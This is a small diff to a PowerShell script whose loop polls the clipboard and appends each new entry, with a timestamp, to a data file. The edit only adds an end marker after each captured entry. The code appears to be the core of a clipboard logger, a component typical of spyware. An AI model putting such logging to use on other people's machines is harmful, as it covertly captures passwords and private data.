@@ -46,7 +46,7 @@ while ($zed = 1) {
 	$clip = get-clipboard
 		if ($clip -ne "") { 
 			if ($clip -ne $oldclip) { 
-				ac $datadir ("`n <<< FROM CLIPBOARD $time >>> `n`n" + $clip)
+				ac $datadir ("`n <<< FROM CLIPBOARD $time >>> `n`n" + $clip + "`n <<< END CLIP >>> `n`n")
                 $oldclip = $clip
                 }
             }
